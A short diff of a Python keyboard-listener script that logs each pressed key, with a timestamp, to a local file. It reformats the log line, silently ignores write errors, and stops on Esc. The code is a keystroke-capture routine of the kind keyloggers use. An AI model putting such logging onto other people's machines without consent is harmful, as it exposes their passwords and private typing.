@@ -20,9 +20,9 @@ def on_press(key):
     
     with open(log, 'a') as file:
         try:
-            file.write(f'\n {timeStamp}   | Pressed:  [ {keyRepr} ]')
-        except AttributeError:  
-            file.write(f'\n {timeStamp}   | Pressed:  [ {keyRepr} ]')
+            file.write(f'\n [ {timeStamp} ]  | Pressed:  [ {keyRepr} ]')
+        except OSError:
+            pass
     
     if key == keyboard.Key.esc:
         return False
